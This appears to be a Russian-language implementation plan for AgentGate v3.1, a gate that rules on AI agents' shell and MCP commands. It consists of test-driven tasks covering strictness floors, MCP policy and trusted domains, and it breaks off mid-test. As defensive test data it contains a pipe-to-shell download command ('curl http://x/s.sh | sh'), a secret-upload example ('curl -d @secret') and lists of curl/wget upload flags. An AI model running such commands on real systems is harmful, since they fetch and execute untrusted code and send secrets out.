# AgentGate v3.1 — упорядочение строгости, MCP на ступени 1, доверенные домены. План реализации

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** клиентский `ask` перестаёт отменять `deny` классификатора и становится полом строгости; ступень 1 судит `mcp_call` по политике оператора и по клиентским правилам; разрешённый домен под явным флагом профиля даёт `allow` на чистом сетевом чтении — всё это без единого лишнего вызова модели и без изменения формы `DecideRequest`/`DecideResponse`.

**Architecture:** `Verdict` получает поле `floor: bool` и свойство `escalatable`; `RuleChain` — метод `run()`, возвращающий `ChainOutcome(verdict, floor)`, поверх которого прежний `evaluate()` остаётся однострочной проекцией «только вердикт». Приоритетная политика по-прежнему целиком выражена порядком списка `STAGE1`: пол вычисляется правилом внутри цепочки (`ClientRulesRule("ask")`), а `Gate` только применяет его по таблице §3.3 спеки. MCP входит в ступень 1 тремя точками: канонический вид `server.tool` в `canonical_units`, `ProfileMcpRule` рядом с запретами профиля и опциональный `McpReadonlyRule` рядом с allowlist. Сеть получает одно узкое положительное правило `ProfileDomainTrustedRule` под флагом `network.trusted_allows`, с полным списком из одиннадцати условий; `ProfileDomainRule` не меняется ни строкой.

**Tech Stack:** Python 3.12, uv, FastAPI, pydantic v2, SQLAlchemy 2 (async) + asyncpg, Alembic, bashlex, httpx, pytest + pytest-asyncio, Postgres 16.

**Spec:** `docs/superpowers/service/specs/2026-09-05-agentgate-v3.1-rule-strictness-mcp-domains-design.md`. Номера разделов ниже — оттуда. Спека закрыта, открытых вопросов владельцу нет.

**Сопутствующие документы:** спека v3 `2026-09-04-agentgate-v3-rules-and-inspect-design.md` (форма `rules`, канонический вид, привязка к `Policy`) и её план `2026-09-04-agentgate-v3-rules-and-inspect.md` — образец формата; `service/CLAUDE.md` — инварианты и карта модулей; `service/README.md` раздел «Как добавить» — как подключается новое правило ступени 1; корневой `CLAUDE.md` — «Известные ограничения», два пункта из которых закрываются здесь.

**Ветка:** `feat/v3.1-strictness-mcp-domains` от `main` (`8ab67c5`).

---

## Global Constraints

Действуют в каждой задаче, в шагах не повторяются.

**Поведение**

- Инвариант обратной совместимости (§7.1.9): запрос без `rules`, профиль без секции `mcp` и `trusted_allows: false` дают ровно сегодняшнее поведение — байт в байт по вердиктам. Ни одно существующее табличное ожидание в `tests/rules/`, `tests/engine/`, `tests/normalize/` не меняется по смыслу; если тест приходится править, правится только форма вызова (`evaluate` → `run`), а не ожидание.
- Fail-closed: ошибка, таймаут, невалидный запрос или невалидный ответ модели → `ask`, HTTP 200. `allow` по ошибке недостижим. **Любой путь, возвращающий `allow`, имеет тест на путь отказа** — это касается всех трёх новых правил (`profile.mcp-allow`, `allowlist.mcp-readonly`, `profile.domain-trusted`).
- Hard-deny не переопределяется ничем, включая пол и все новые правила. `client.deny` не переопределяется ничем, кроме hard-deny, и не эскалируется.
- Пол только ужесточает: `strictness(final) >= strictness(floor)` и `strictness(final) >= strictness(stage2)`. Пол никогда не даёт `allow` и никогда не превращается в `deny` сам по себе.
- Пол не добавляет вызовов ступени 2 и не убирает их: множество запросов, на которых вызван классификатор, не зависит от наличия пола (§7.1.7).
- Решение по сырой строке запрещено: MCP матчится по `server.tool` из `McpArgs`, никогда по `raw`; `arguments` MCP-вызова в матчинге не участвуют вовсе (§7.1.10).
- Табличные тесты hard-deny включают обфускацию; табличный тест `ProfileMcpRule` включает обфускацию имени (регистр, гомоглиф, разделитель).
- Бюджет ступени 1: p50 ≤ 1 мс при 500 клиентских шаблонах, заполненной секции `mcp` и обоих включённых флагах — существующий тест `tests/rules/test_latency.py` остаётся зелёным, к нему добавляется один случай.
- Только Postgres. Тесты с БД под `requires_db`.

**Контракт**

- Схема профиля меняется в задаче 2, поэтому `contracts/` перегенерируются в задачах 2 и 7:
  ```bash
  cd service && uv run python scripts/export_contracts.py && uv run python scripts/export_openapi.py
  ```
- В любой другой задаче контракт проверяется, а не перегенерируется:
  ```bash
  cd service && git diff --exit-code ../contracts
  ```
- `DecideRequest` и `DecideResponse` не меняются. Новые только значения `rule_id`; словарь `rule_id` открытый, адаптеры на него не матчат.
- Изменение контракта — PR с упоминанием направлений service, adapters, benchmark.

**Процесс**

- TDD: сначала падающий тест, потом минимальная реализация. Код и комментарии — английский; документация — русский; идентификаторы API не переводятся.
- Все команды — из `service/`, через `uv run`. Полный прогон перед каждым коммитом:
  ```bash
  cd service && AGENTGATE_TEST_DB_URL=postgresql+asyncpg://agentgate:agentgate@localhost:5433/agentgate_test uv run pytest -q
  ```
  Ниже эта строка сокращается до `<FULL>`.
- Коммит только явных путей: `git commit --only <пути> -m "…"`, никогда `git add … && git commit`. Сообщение заканчивается строкой `Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>`.
- Зона записи: `service/`, `contracts/`, `docs/reports/`, корневой `CLAUDE.md`, `docs/connect.md`. Ничего в `adapters/`, `benchmark/`, `frontend/` не меняется — бенчмарк только запускается.
- Отчёт по завершении: `docs/reports/task-23-v3.1-strictness-mcp-domains.md` (23 — следующий свободный номер).

**Одно осознанное отступление от буквы спеки**

§3.2 говорит: «`RuleChain.evaluate` перестаёт возвращать `Verdict | None` и возвращает `ChainOutcome`». В дереве `evaluate` вызывается из `Gate` один раз и из тестов — примерно шестьдесят раз (`tests/rules/test_chain.py`, `test_client_rules.py`, `test_latency.py`, `test_base.py`). Смена сигнатуры переписала бы шестьдесят ожиданий ради формы, а не ради поведения, и заодно стёрла бы границу между «что решила цепочка» и «что из этого следует». Поэтому: **новый метод `RuleChain.run(action, policy) -> ChainOutcome` содержит весь цикл, а `evaluate` остаётся и становится однострочной проекцией `return self.run(action, policy).verdict`.** Знание живёт в одном месте, `Gate` зовёт `run`, существующие тесты не трогаются. Смысл спеки сохранён полностью; расхождение в букве фиксируется в отчёте (задача 8).

## Карта файлов

| Файл | Действие | Ответственность |
|---|---|---|
| `agentgate/domain/verdict.py` | изменить | `floor: bool`, `strictness`, `escalatable` |
| `agentgate/rules/base.py` | изменить | `ChainOutcome`, `RuleChain.run`, `evaluate` как проекция |
| `agentgate/domain/domains.py` | создать | `domain_allowed(domain, allowed)` — одна проверка домена на два правила |
| `agentgate/profiles/schema.py` | изменить | `Network.trusted_allows`, `McpPolicy`, `Profile.mcp` |
| `agentgate/domain/policy.py` | изменить | свойство `Policy.mcp` |
| `agentgate/shell/commands.py` | изменить | `CommandSpec.output_flags`, строки `curl` и `wget` |
| `agentgate/rules/profile_domains.py` | изменить | использует `domain_allowed` (поведение то же) |
| `agentgate/rules/client_rules.py` | изменить | канонический вид `server.tool`, ветка `_allow` для MCP, `floor=True` у режима `ask` |
| `agentgate/rules/profile_mcp.py` | создать | `ProfileMcpRule`: `deny` > `ask` > `allow` по `mcp` профиля |
| `agentgate/rules/mcp_readonly.py` | создать | `McpReadonlyRule`: `allow` по префиксам имени под флагом профиля |
| `agentgate/rules/profile_domain_trusted.py` | создать | `ProfileDomainTrustedRule`: одиннадцать условий §5.2 |
| `agentgate/rules/chain.py` | изменить | три новые строки `STAGE1` |
| `agentgate/engine/gate.py` | изменить | применение пола (§3.2), `escalatable` в `_escalate` |
| `tests/factories.py` | изменить | `mcp_action`, `mcp_policy_profile`, `trusted_policy` |
| `tests/rules/test_base.py` | изменить | поведение `run` с полом |
| `tests/rules/test_client_rules.py` | изменить | MCP-шаблоны, ограничение по `/`, `arguments` не влияют |
| `tests/rules/test_profile_mcp.py` | создать | таблица `deny` > `ask` > `allow`, обфускация |
| `tests/rules/test_mcp_readonly.py` | создать | флаг выключен/включён, префиксы |
| `tests/rules/test_profile_domain_trusted.py` | создать | одиннадцать отказов + положительные |
| `tests/engine/test_gate_floor.py` | создать | таблица §3.3, инвариант «пол не зовёт модель», кэш §3.5 |
| `tests/engine/test_escalation.py` | создать | `client.deny` не эскалируется, `profile.path` эскалируется |
| `tests/profiles/test_schema.py`, `tests/shell/test_commands.py`, `tests/rules/test_latency.py`, `tests/test_contracts.py` | изменить | схема, таблица команд, латентность, контракты |
| `contracts/openapi.yaml`, `contracts/README.md`, `docs/connect.md`, `CLAUDE.md` | изменить | перегенерация и документация |
| `docs/reports/task-23-v3.1-strictness-mcp-domains.md` | создать | отчёт |

---

## Волна 1 — фундамент

### Task 1: Строгость как тип

Закрывает §3.2 (механизм `ChainOutcome`, поле `floor`) и подготовку §3.4 (`escalatable`). Поведение сервиса не меняется: пол пока никто не возвращает.

**Files:**
- Modify: `service/agentgate/domain/verdict.py`, `service/agentgate/rules/base.py`
- Test (оба файла уже существуют, тесты дописываются): `service/tests/domain/test_verdict.py`, `service/tests/rules/test_base.py`

- [ ] **Step 1: Падающие тесты для `Verdict`**

Дописать в существующий `service/tests/domain/test_verdict.py` (импорты `DecisionKind` и `Verdict` в файле уже есть):

```python
def test_a_verdict_is_not_a_floor_by_default():
    assert Verdict.allow("allowlist.readonly").floor is False
    assert Verdict.ask("client.ask", "confirm").floor is False


def test_ask_can_be_built_as_a_floor():
    verdict = Verdict.ask("client.ask", "confirm", floor=True)
    assert verdict.floor is True and verdict.decision is DecisionKind.ask and verdict.stage == 1


def test_strictness_orders_allow_below_ask_below_deny():
    allow = Verdict.allow("allowlist.readonly")
    ask = Verdict.ask("client.ask", "confirm")
    deny = Verdict.deny("client.deny", "no")
    assert allow.strictness < ask.strictness < deny.strictness


def test_an_ordinary_verdict_is_escalatable():
    assert Verdict.deny("profile.path", "outside").escalatable is True


def test_a_hard_verdict_is_not_escalatable():
    assert Verdict.deny("hard-deny.pipe-exec", "no", hard=True).escalatable is False


def test_the_users_own_denial_is_not_escalatable():
    assert Verdict.deny("client.deny", "blocked by your rules").escalatable is False
```

- [ ] **Step 2: Падающие тесты для цепочки**

Дописать в `service/tests/rules/test_base.py` (импорт `ChainOutcome` добавить в верхний блок: `from agentgate.rules.base import ChainOutcome, RuleChain`):

```python
def floor_rule(rule_id: str = "client.ask") -> StaticRule:
    return StaticRule(rule_id, Verdict.ask(rule_id, "confirm", floor=True))


def test_run_returns_an_empty_outcome_for_an_empty_chain():
    outcome = RuleChain([]).run(None, None)
    assert outcome.verdict is None and outcome.floor is None


def test_a_floor_does_not_stop_the_chain():
    later = StaticRule("c", Verdict.allow("c"))
    outcome = RuleChain([floor_rule(), later]).run(None, None)
    assert later.calls == 1
    assert outcome.verdict.rule_id == "c" and outcome.floor.rule_id == "client.ask"


def test_the_first_floor_wins_over_a_later_one():
    outcome = RuleChain([floor_rule("client.ask"), floor_rule("second")]).run(None, None)
    assert outcome.floor.rule_id == "client.ask" and outcome.verdict is None


def test_a_floor_survives_a_chain_that_reaches_its_end():
    outcome = RuleChain([floor_rule(), StaticRule("c", None)]).run(None, None)
    assert outcome.verdict is None and outcome.floor.rule_id == "client.ask"


def test_an_ordinary_verdict_after_a_floor_stops_the_chain_and_keeps_the_floor():
    later = StaticRule("d", Verdict.allow("d"))
    outcome = RuleChain([floor_rule(), StaticRule("c", Verdict.deny("c", "no")), later]).run(None, None)
    assert outcome.verdict.rule_id == "c" and outcome.floor.rule_id == "client.ask"
    assert later.calls == 0


def test_evaluate_still_answers_with_the_verdict_alone():
    chain = RuleChain([floor_rule(), StaticRule("c", Verdict.deny("c", "no"))])
    assert chain.evaluate(None, None).rule_id == "c"


def test_evaluate_hides_a_floor_that_settled_nothing():
    assert RuleChain([floor_rule()]).evaluate(None, None) is None
```

- [ ] **Step 3: Убедиться, что падают**

Run: `cd service && uv run pytest tests/domain/test_verdict.py tests/rules/test_base.py -q`
Expected: `ImportError: cannot import name 'ChainOutcome' from 'agentgate.rules.base'` и `TypeError: Verdict.ask() got an unexpected keyword argument 'floor'`.

- [ ] **Step 4: Реализация в `agentgate/domain/verdict.py`**

Дописать в докстринг модуля абзац:

```python
"""...

`floor` marks a verdict that is not a decision but a lower bound on
strictness for the rest of the chain: the chain records it and keeps
going. Only `ask` is ever produced as a floor -- a floor that could deny
would be a decision wearing a disguise.

`escalatable` says whether escalation may replace this verdict with an
ask. False for a hard verdict and for the user's own `client.deny`:
turning a user's "no" into "ask me" is not a softening the service is
entitled to.
"""
```

Константа и поля:

```python
from agentgate.api.schemas import Cost, DecisionKind

# The total order of strictness (spec v3.1 §3.1). Compared, never stored.
_STRICTNESS: dict[DecisionKind, int] = {
    DecisionKind.allow: 0,
    DecisionKind.ask: 1,
    DecisionKind.deny: 2,
}

# Verdicts escalation must not touch, by rule_id. `hard` covers hard-deny;
# the user's own denial is not hard, but is just as much theirs to keep.
_NOT_ESCALATABLE = frozenset({"client.deny"})
```

В `@dataclass(frozen=True) class Verdict` добавить поле после `hard`:

```python
    floor: bool = False
```

Изменить `ask` и добавить два свойства (остальные конструкторы не трогаются):

```python
    @classmethod
    def ask(
        cls, rule_id: str, reason: str, suggest: str = "", *, stage: int = 1, floor: bool = False
    ) -> "Verdict":
        return cls(
            decision=DecisionKind.ask, stage=stage, rule_id=rule_id,
            reason=reason, suggest=suggest, floor=floor,
        )

    @property
    def strictness(self) -> int:
        """Where this verdict sits in the total order allow < ask < deny."""
        return _STRICTNESS[self.decision]

    @property
    def escalatable(self) -> bool:
        """Whether escalation may replace this verdict with an ask."""
        return not self.hard and self.rule_id not in _NOT_ESCALATABLE
```

- [ ] **Step 5: Реализация в `agentgate/rules/base.py`**

Дописать в докстринг модуля:

```python
"""...

A rule may also answer with a floor -- a verdict carrying `floor=True`.
That is not a decision: the chain records the first one it is given and
keeps running, so a floor can never switch off a stricter rule below it.
`run` returns both halves; `evaluate` is the projection for callers that
only care what the chain decided.
"""
```

Реализация (импорт `dataclass` добавить):

```python
from collections.abc import Sequence
from dataclasses import dataclass
from typing import Protocol

from agentgate.domain.policy import Policy
from agentgate.domain.verdict import Verdict
from agentgate.normalize.model import NormalizedAction


@dataclass(frozen=True)
class ChainOutcome:
    """What one pass of the chain produced: at most one decision, and at
    most one lower bound on strictness for whatever decides next."""

    verdict: Verdict | None = None
    floor: Verdict | None = None


class RuleChain:
    """Runs rules in order and returns the first verdict; the order the
    chain is built in is the whole of stage 1's priority policy.
    """

    def __init__(self, rules: Sequence[Rule]) -> None:
        self._rules = tuple(rules)

    def run(self, action: NormalizedAction, policy: Policy) -> ChainOutcome:
        floor: Verdict | None = None
        for rule in self._rules:
            verdict = rule.evaluate(action, policy)
            if verdict is None:
                continue
            if verdict.floor:
                # The first floor is the strictest by position, so a later
                # one never replaces it.
                floor = floor if floor is not None else verdict
                continue
            return ChainOutcome(verdict=verdict, floor=floor)
        return ChainOutcome(verdict=None, floor=floor)

    def evaluate(self, action: NormalizedAction, policy: Policy) -> Verdict | None:
        return self.run(action, policy).verdict
```

- [ ] **Step 6: Тесты проходят**

Run: `cd service && uv run pytest tests/domain/test_verdict.py tests/rules -q`
Expected: PASS, ноль падений; в частности `tests/rules/test_chain.py` не тронут и зелёный.

- [ ] **Step 7: Полный прогон и контракт**

Run: `cd service && <FULL> && git diff --exit-code ../contracts`
Expected: всё зелёное, контракты без diff (`Verdict` наружу не отдаётся).

- [ ] **Step 8: Коммит**

```bash
git commit --only service/agentgate/domain/verdict.py service/agentgate/rules/base.py service/tests/domain/test_verdict.py service/tests/rules/test_base.py -m "feat(domain): strictness as a type — a verdict can be a floor, and a chain reports both

Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>"
```

---

### Task 2: Схема профиля, доменная проверка и флаги вывода

Закрывает §4.2 (`McpPolicy`, `Profile.mcp`, `Policy.mcp`), §5.2 пункт 1 (`network.trusted_allows`), §5.2 пункт 4 (общая функция `domain_allowed`), §5.2 пункт 7 (`CommandSpec.output_flags`) и §6 в части перегенерации контракта.

**Files:**
- Modify: `service/agentgate/profiles/schema.py`, `service/agentgate/domain/policy.py`, `service/agentgate/rules/profile_domains.py`, `service/agentgate/shell/commands.py`, `service/tests/factories.py`
- Create: `service/agentgate/domain/domains.py`, `service/tests/domain/test_domains.py`
- Test: `service/tests/profiles/test_schema.py`, `service/tests/shell/test_commands.py`, `service/tests/rules/test_profile_domains.py`, `service/tests/test_contracts.py`
- Regenerate: `contracts/openapi.yaml`

- [ ] **Step 1: Падающие тесты схемы**

Дописать в `service/tests/profiles/test_schema.py` (импорт: `from agentgate.profiles.schema import McpPolicy, ...`):

```python
def test_trusted_allows_defaults_to_false():
    p = Profile.model_validate(minimal_profile_data())
    assert p.network.trusted_allows is False


def test_trusted_allows_is_read_from_the_profile():
    p = Profile.model_validate(minimal_profile_data(
        network={"mode": "allowlist", "allowed_domains": ["pypi.org"], "trusted_allows": True}
    ))
    assert p.network.trusted_allows is True


def test_mcp_section_defaults_to_empty_and_off():
    p = Profile.model_validate(minimal_profile_data())
    assert p.mcp == McpPolicy()
    assert p.mcp.allow == [] and p.mcp.ask == [] and p.mcp.deny == []
    assert p.mcp.readonly_prefixes_allow is False


def test_mcp_section_is_read_from_the_profile():
    p = Profile.model_validate(minimal_profile_data(mcp={
        "allow": ["github.get_*"], "ask": ["github.create_*"],
        "deny": ["*.delete_*"], "readonly_prefixes_allow": True,
    }))
    assert p.mcp.allow == ["github.get_*"] and p.mcp.deny == ["*.delete_*"]
    assert p.mcp.readonly_prefixes_allow is True


def test_the_new_fields_enter_the_profile_hash():
    plain = Profile.model_validate(minimal_profile_data())
    with_mcp = Profile.model_validate(minimal_profile_data(mcp={"deny": ["*.delete_*"]}))
    trusted = Profile.model_validate(minimal_profile_data(
        network={"mode": "allowlist", "allowed_domains": ["pypi.org"], "trusted_allows": True}
    ))
    assert len({plain.profile_hash(), with_mcp.profile_hash(), trusted.profile_hash()}) == 3
```

- [ ] **Step 2: Падающие тесты доменной проверки и таблицы команд**

Создать `service/tests/domain/test_domains.py`:

```python
import pytest

from agentgate.domain.domains import domain_allowed


@pytest.mark.parametrize(
    ("domain", "allowed", "expected"),
    [
        ("pypi.org", ["pypi.org"], True),
        ("files.pypi.org", ["pypi.org"], True),
        ("PyPI.org", ["pypi.org"], True),
        ("pypi.org", ["PyPI.org"], True),
        ("evil.sh", ["pypi.org"], False),
        ("notpypi.org", ["pypi.org"], False),
        ("pypi.org.evil.sh", ["pypi.org"], False),
        ("pypi.org", [], False),
    ],
    ids=[
        "exact", "subdomain", "action_case_folds", "allowlist_case_folds",
        "other_domain", "suffix_is_not_a_subdomain", "domain_as_a_prefix", "empty_allowlist",
    ],
)
def test_domain_allowed(domain, allowed, expected):
    assert domain_allowed(domain, allowed) is expected
```

Дописать в `service/tests/shell/test_commands.py`:

```python
def test_curl_declares_the_flags_that_write_a_file():
    flags = spec_for("curl").output_flags
    assert {"-o", "--output", "-O", "--remote-name", "--output-dir"} <= flags


def test_wget_declares_the_flags_that_write_a_file():
    flags = spec_for("wget").output_flags
    assert {"-O", "--output-document", "-P", "--directory-prefix"} <= flags


def test_a_command_with_no_row_declares_no_output_flags():
    assert spec_for("definitely-not-a-command").output_flags == frozenset()


def test_a_reading_command_declares_no_output_flags():
    assert spec_for("cat").output_flags == frozenset()
```

(В `tests/shell/test_commands.py` уже импортирован `spec_for`; если нет — добавить `from agentgate.shell.commands import spec_for` в верхний блок.)

- [ ] **Step 3: Убедиться, что падают**

Run: `cd service && uv run pytest tests/profiles/test_schema.py tests/domain/test_domains.py tests/shell/test_commands.py -q`
Expected: `ImportError: cannot import name 'McpPolicy'`, `ModuleNotFoundError: No module named 'agentgate.domain.domains'`, `AttributeError: 'CommandSpec' object has no attribute 'output_flags'`.

- [ ] **Step 4: `agentgate/profiles/schema.py`**

Заменить класс `Network` и добавить `McpPolicy` рядом с `InspectSettings`:

```python
class Network(BaseModel):
    mode: NetworkMode = NetworkMode.allowlist
    allowed_domains: list[str] = Field(default_factory=list)
    trusted_allows: bool = Field(
        default=False,
        description=(
            "Whether a listed domain may also carry a positive verdict. Off by "
            "default: `allowed_domains` is a gate that forbids, not a promise "
            "that a command is safe. When on, and only in modes `allowlist` and "
            "`ask`, `profile.domain-trusted` may allow a purely read-only "
            "network command whose every domain is listed."
        ),
    )


class McpPolicy(BaseModel):
    """The operator's policy over MCP calls, matched against `server.tool`.

    `fnmatch` semantics, case-sensitive, exactly like the user's own command
    patterns: MCP tool names are case-sensitive and nothing is folded. When
    a call matches several lists the strictest wins -- deny, then ask, then
    allow. Arguments of the call are never matched: they are arbitrary JSON,
    and globbing their serialization would be deciding on untrusted text.
    """

    allow: list[str] = Field(default_factory=list)
    ask: list[str] = Field(default_factory=list)
    deny: list[str] = Field(default_factory=list)
    readonly_prefixes_allow: bool = Field(
        default=False,
        description=(
            "Whether `allowlist.mcp-readonly` may allow a call whose tool name "
            "begins with a reading prefix (`get_`, `list_`, `search_`, `read_`, "
            "`describe_`). Off by default: a prefix is a convention, not a proof."
        ),
    )
```

В `Profile` добавить поле после `inspect`:

```python
    mcp: McpPolicy = Field(default_factory=McpPolicy)
```

- [ ] **Step 5: `agentgate/domain/domains.py`**

```python
"""Is this domain covered by an allowlist entry.

One function, because two rules ask the same question and would otherwise
answer it twice: `ProfileDomainRule` denies what is not covered, and
`ProfileDomainTrustedRule` allows only what is. A subdomain of a listed
domain counts; a domain that merely ends with the listed text does not
(`notpypi.org` is not `pypi.org`). Comparison is case-insensitive on both
sides -- DNS labels are.
"""

from collections.abc import Iterable


def domain_allowed(domain: str, allowed_domains: Iterable[str]) -> bool:
    folded = domain.casefold()
    for allowed in allowed_domains:
        entry = allowed.casefold()
        if folded == entry or folded.endswith("." + entry):
            return True
    return False
```

- [ ] **Step 6: `agentgate/rules/profile_domains.py` — та же семантика через общую функцию**

Заменить тело `evaluate` (поведение не меняется; исчезает вторая копия проверки):

```python
from agentgate.domain.domains import domain_allowed
from agentgate.domain.policy import Policy
from agentgate.domain.verdict import Verdict
from agentgate.normalize.model import NormalizedAction
from agentgate.profiles.schema import NetworkMode


class ProfileDomainRule:
    id = "profile.domain"
    hard = False

    def evaluate(self, action: NormalizedAction, policy: Policy) -> Verdict | None:
        if not action.domains or policy.network.mode is NetworkMode.open:
            return None
        for domain in action.domains:
            if domain_allowed(domain, policy.network.allowed_domains):
                continue
            if policy.network.mode is NetworkMode.ask:
                return Verdict.ask(self.id, f"domain {domain} is not in the allowlist")
            return Verdict.deny(
                self.id, f"domain {domain} is not in the allowlist",
                "Use an allowed registry or ask the user to extend the allowlist",
            )
        return None
```

- [ ] **Step 7: `agentgate/domain/policy.py` — свойство `mcp`**

Импорт: `from agentgate.profiles.schema import Escalation, History, InspectSettings, McpPolicy, Network, Profile, Prose`. Свойство после `network`:

```python
    @property
    def mcp(self) -> McpPolicy:
        return self.profile.mcp
```

- [ ] **Step 8: `agentgate/shell/commands.py` — `output_flags`**

В `CommandSpec` после `upload_flags`:

```python
    # Options whose value names a file (or a directory) the command
    # WRITES. Separate from upload_flags, which name what goes out:
    # `curl -o report.html` keeps the response, `curl -d @secret` sends
    # a secret. A rule that allows a read from a trusted domain has to
    # refuse both, for opposite reasons.
    output_flags: frozenset[str] = field(default_factory=frozenset)
```

В `_row` — параметр и передача:

```python
def _row(
    name: str,
    *roles: Role,
    value_flags: Sequence[str] = (),
    upload_flags: Sequence[str] = (),
    output_flags: Sequence[str] = (),
    write_target: WriteTarget = WriteTarget.NONE,
    path_arguments: PathArguments = PathArguments.UNDECLARED,
    readonly_subcommands: Sequence[str] = (),
) -> CommandSpec:
    return CommandSpec(
        name=name,
        roles=frozenset(roles),
        value_flags=frozenset(value_flags),
        upload_flags=frozenset(upload_flags),
        output_flags=frozenset(output_flags),
        write_target=write_target,
        path_arguments=path_arguments,
        readonly_subcommands=frozenset(readonly_subcommands),
    )
```

Две строки таблицы:

```python
        _row("curl", Role.NETWORK, Role.DOWNLOADER, upload_flags=(
            "-T", "--upload-file", "-d", "--data", "--data-ascii", "--data-binary",
            "--data-raw", "--data-urlencode", "-F", "--form",
        ), output_flags=("-o", "--output", "-O", "--remote-name", "--output-dir")),
```

```python
        _row("wget", Role.NETWORK, Role.DOWNLOADER,
             upload_flags=("--post-file", "--post-data"),
             output_flags=("-O", "--output-document", "-P", "--directory-prefix")),
```

- [ ] **Step 9: `tests/factories.py` — две новые фабрики**

Добавить после `stage1_policy`:

```python
def mcp_policy(**mcp) -> Policy:
    """`stage1_policy` with the operator's MCP section filled in."""
    return stage1_policy(mcp=mcp)


def trusted_policy(mode: str = "allowlist", domains: tuple[str, ...] = ("pypi.org", "github.com"), **overrides) -> Policy:
    """`stage1_policy` with `network.trusted_allows` on, for the trusted-domain rule."""
    network = {"mode": mode, "allowed_domains": list(domains), "trusted_allows": True}
    return stage1_policy(network=network, **overrides)
```

Добавить после `shell_action`:

```python
def mcp_action(
    server: str = "github", tool: str = "get_issue",
    arguments: dict | None = None, cwd: str = WORKSPACE,
) -> NormalizedAction:
    """What an MCP call normalizes to: `mcp` filled, no commands and no paths."""
    return normalize(DecideRequest(
        harness="t", tool="mcp_call", raw="",
        args={"cwd": cwd, "mcp": {"server": server, "tool": tool, "arguments": arguments or {}}},
        user_request="x",
    ))
```

- [ ] **Step 10: Тесты проходят**

Run: `cd service && uv run pytest tests/profiles tests/domain tests/shell tests/rules/test_profile_domains.py -q`
Expected: PASS. `tests/rules/test_profile_domains.py` — регресс: поведение `ProfileDomainRule` не изменилось.

- [ ] **Step 11: Перегенерация контракта**

Профиль отдаётся через `GET /v1/profiles/{id}`, поэтому OpenAPI меняется.

```bash
cd service && uv run python scripts/export_contracts.py && uv run python scripts/export_openapi.py
git diff --stat ../contracts
```
Expected: изменён только `contracts/openapi.yaml` — появились `McpPolicy` в `components.schemas` и поле `trusted_allows` в `Network`. `decide_request.schema.json` и `decide_response.schema.json` без изменений.

- [ ] **Step 12: Полный прогон**

Run: `cd service && <FULL>`
Expected: PASS, включая `tests/test_contracts.py`.

- [ ] **Step 13: Коммит**

```bash
git commit --only service/agentgate/profiles/schema.py service/agentgate/domain/domains.py service/agentgate/domain/policy.py service/agentgate/rules/profile_domains.py service/agentgate/shell/commands.py service/tests/factories.py service/tests/profiles/test_schema.py service/tests/domain/test_domains.py service/tests/shell/test_commands.py contracts/openapi.yaml -m "feat(profiles): an mcp section, trusted_allows, one domain check and the flags that write a file

Co-Authored-By: Claude Fable 5.1 <noreply@anthropic.com>"
```

---

## Волна 2 — правила

### Task 3: Пол вместо вердикта

Закрывает §3.2 целиком, §3.3 (все строки таблицы), §3.4 (эскалация) и §3.5 (кэш). Зависит от задачи 1.

**Files:**
- Modify: `service/agentgate/rules/client_rules.py`, `service/agentgate/engine/gate.py`
- Create: `service/tests/engine/test_gate_floor.py`, `service/tests/engine/test_escalation.py`
- Test: `service/tests/rules/test_client_rules.py`

- [ ] **Step 1: Падающий тест — правило возвращает пол**

Дописать в `service/tests/rules/test_client_rules.py`:

```python
def test_client_ask_is_a_floor_not_a_verdict():
    outcome = STAGE1.run(shell_action("npm install lodash"), policy_with(ask=["npm install*"]))
    assert outcome.verdict is None
    assert outcome.floor is not None and outcome.floor.rule_id == "client.ask" and outcome.floor.floor is True


def test_client_ask_does_not_stop_the_allowlist_from_answering():
    outcome = STAGE1.run(shell_action("ls -la"), policy_with(ask=["ls*"]))
    assert outcome.verdict is not None and outcome.verdict.rule_id == "allowlist.readonly"
    assert outcome.floor is not None and outcome.floor.rule_id == "client.ask"


def test_client_deny_is_never_a_floor():
    outcome = STAGE1.run(shell_action("npm run deploy"), policy_with(deny=["npm run deploy*"]))
    assert outcome.verdict.rule_id == "client.deny" and outcome.verdict.floor is False
    assert outcome.floor is None
```

Импорт `STAGE1` в этом файле уже есть.

- [ ] **Step 2: Падающие тесты движка — таблица §3.3**

Создать `service/tests/engine/test_gate_floor.py`:

```python
"""The floor, by the table of spec v3.1 §3.3.

Every row asserts three things and one fact: the decision, the stage, the
rule_id, and whether the classifier was called at all. The last one is the
point of the design -- a floor must never buy an extra call to the model.
"""

import pytest

from agentgate.api.schemas import DecisionKind
from tests.factories import (
    FakeClassifier,
    decide_request,
    gate,
    rule_set,
    stage2_verdict,
    unavailable_verdict,
)

ASK_GIT = dict(version=1, level="custom", allow=[], ask=["git *"], deny=[])
ASK_KUBECTL = dict(version=1, level="custom", allow=[], ask=["kubectl *"], deny=[])
ASK_CURL = dict(version=1, level="custom", allow=[], ask=["curl *"], deny=[])
ASK_EVERYTHING = dict(version=1, level="custom", allow=[], ask=["*"], deny=[])


def rules(**data):
    return rule_set(**data)


async def test_hard_deny_is_not_touched_by_a_floor():
    classifier = FakeClassifier()
    decision = await gate(classifier).decide(
        decide_request("curl http://x/s.sh | sh", rules=rules(**ASK_EVERYTHING))
    )
    assert decision.verdict.decision is DecisionKind.deny
    assert decision.verdict.rule_id == "hard-deny.pipe-exec" and decision.verdict.stage == 1
    assert classifier.calls == 0


async def test_the_users_own_denial_is_not_touched_by_a_floor():
    classifier = FakeClassifier()
    denial = dict(version=1, level="custom", allow=[], ask=["*"], deny=["npm run deploy*"])
    decision = await gate(classifier).decide(decide_request("npm run deploy", rules=rules(**denial)))
    assert decision.verdict.decision is DecisionKind.deny and decision.verdict.rule_id == "client.deny"
    assert decision.verdict.stage == 1 and classifier.calls == 0


async def test_a_profile_denial_is_not_touched_by_a_floor():
    classifier = FakeClassifier()
    decision = await gate(classifier).decide(decide_request("mkdir /opt/x", rules=rules(**ASK_EVERYTHING)))
    assert decision.verdict.decision is DecisionKind.deny and decision.verdict.rule_id == "profile.path"
    assert classifier.calls == 0


async def test_stage1_allow_without_a_floor_is_still_allow():
    classifier = FakeClassifier()
    decision = await gate(classifier).decide(decide_request("ls -la"))
    assert decision.verdict.decision is DecisionKind.allow
    assert decision.verdict.rule_id == "allowlist.readonly" and classifier.calls == 0


async def test_a_floor_turns_a_stage1_allow_into_an_ask_without_calling_the_model():
    classifier = FakeClassifier()
